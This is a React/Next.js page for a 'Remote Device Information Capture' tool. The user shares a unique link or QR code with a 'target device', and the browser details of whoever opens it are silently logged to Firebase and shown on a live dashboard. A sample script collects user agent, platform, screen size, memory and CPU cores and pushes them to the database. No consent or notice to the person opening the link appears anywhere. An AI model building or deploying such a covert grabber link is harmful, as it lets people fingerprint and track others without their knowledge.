"use client";

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Smartphone, QrCode, Link2, Copy, Check, Database, Cpu, HardDrive, Wifi } from "lucide-react";
import { ref, push, onValue, set } from "firebase/database";
import { database } from "@/lib/firebase";
import { useAuth } from "@/contexts/AuthContext";

interface DeviceInfo {
  id: string;
  userAgent: string;
  platform: string;
  language: string;
  screenWidth: number;
  screenHeight: number;
  colorDepth: number;
  timestamp: number;
  ip?: string;
}

export default function DeviceDataPage() {
  const [uniqueLink, setUniqueLink] = useState("");
  const [copied, setCopied] = useState(false);
  const [capturedDevices, setCapturedDevices] = useState<DeviceInfo[]>([]);
  const { user } = useAuth();

  useEffect(() => {
    if (user) {
      const linkId = user.uid.slice(0, 8);
      setUniqueLink(`${window.location.origin}/capture/${linkId}`);

      const devicesRef = ref(database, `device-data/${linkId}`);
      const unsubscribe = onValue(devicesRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const deviceList = Object.entries(data).map(([id, device]) => ({
            id,
            ...(device as Omit<DeviceInfo, 'id'>),
          }));
          setCapturedDevices(deviceList.reverse());
        }
      });

      return () => unsubscribe();
    }
  }, [user]);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(uniqueLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen px-4 pb-32 pt-28">
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center"
      >
        <motion.img
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/photo_2026-05-12_13-19-21-I7kWhxum6OQv4MpbRdO4rwicOxF9Km.jpg" 
          alt="MIT Network Logo" 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="mx-auto mb-4 h-24 w-24 object-contain drop-shadow-[0_0_20px_rgba(16,185,129,0.5)]"
          crossOrigin="anonymous"
        />
        
        <h1 className="text-3xl font-bold text-white">Device Data</h1>
        <p className="mt-2 text-sm text-emerald-400/60">Remote Device Information Capture</p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.4 }}
        className="mx-auto mt-8 max-w-md rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm"
      >
        <p className="text-sm text-emerald-400/80">
          Share the link below with the target device. When they open the link, 
          their device information will be captured and displayed here in real-time.
        </p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.5 }}
        className="mx-auto mt-6 max-w-md space-y-4"
      >
        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm">
          <div className="mb-3 flex items-center gap-2 text-sm text-emerald-400">
            <Link2 size={16} />
            <span>Capture Link</span>
          </div>
          <div className="flex items-center gap-2">
            <input
              type="text"
              value={uniqueLink}
              readOnly
              className="flex-1 rounded-xl border border-emerald-500/20 bg-black/30 px-3 py-2 text-xs text-emerald-300 outline-none"
            />
            <motion.button
              onClick={copyToClipboard}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              className="rounded-xl bg-emerald-600 p-2 text-white"
            >
              {copied ? <Check size={18} /> : <Copy size={18} />}
            </motion.button>
          </div>
        </div>

        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 text-center backdrop-blur-sm">
          <QrCode size={100} className="mx-auto text-emerald-400" />
          <p className="mt-2 text-xs text-emerald-500/50">Scan to capture device data</p>
        </div>
      </motion.div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.6 }}
        className="mx-auto mt-8 max-w-md"
      >
        <h2 className="mb-4 flex items-center gap-2 text-sm uppercase tracking-widest text-emerald-400/60">
          <Database size={14} />
          Captured Devices ({capturedDevices.length})
        </h2>

        {capturedDevices.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-emerald-500/20 bg-emerald-950/20 p-8 text-center">
            <Wifi className="mx-auto mb-3 h-12 w-12 text-emerald-500/30" />
            <p className="text-sm text-emerald-500/50">Waiting for device connections...</p>
          </div>
        ) : (
          <div className="space-y-3">
            {capturedDevices.map((device, index) => (
              <motion.div
                key={device.id}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: index * 0.1 }}
                className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm"
              >
                <div className="mb-3 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="h-2 w-2 rounded-full bg-emerald-500" />
                    <span className="text-xs text-emerald-400">Device #{index + 1}</span>
                  </div>
                  <span className="text-xs text-emerald-500/50">
                    {new Date(device.timestamp).toLocaleString()}
                  </span>
                </div>
                
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div className="flex items-center gap-2 rounded-lg bg-black/20 p-2">
                    <Cpu size={12} className="text-emerald-500" />
                    <span className="text-emerald-300">{device.platform}</span>
                  </div>
                  <div className="flex items-center gap-2 rounded-lg bg-black/20 p-2">
                    <HardDrive size={12} className="text-emerald-500" />
                    <span className="text-emerald-300">{device.screenWidth}x{device.screenHeight}</span>
                  </div>
                </div>
                
                <p className="mt-2 truncate text-xs text-emerald-500/50">
                  {device.userAgent}
                </p>
              </motion.div>
            ))}
          </div>
        )}
      </motion.div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mx-auto mt-8 max-w-md rounded-xl border border-emerald-500/10 bg-emerald-950/20 p-4"
      >
        <h3 className="mb-3 text-sm font-medium text-emerald-400">Sample Code</h3>
        <pre className="overflow-x-auto rounded-lg bg-black/40 p-3 text-xs text-emerald-300">
{`// Device data capture script
const deviceInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  screen: {
    width: screen.width,
    height: screen.height,
    colorDepth: screen.colorDepth
  },
  memory: navigator.deviceMemory,
  cores: navigator.hardwareConcurrency
};

// Send to Firebase
firebase.database()
  .ref('device-data')
  .push(deviceInfo);`}
        </pre>
      </motion.div>
    </div>
  );
}
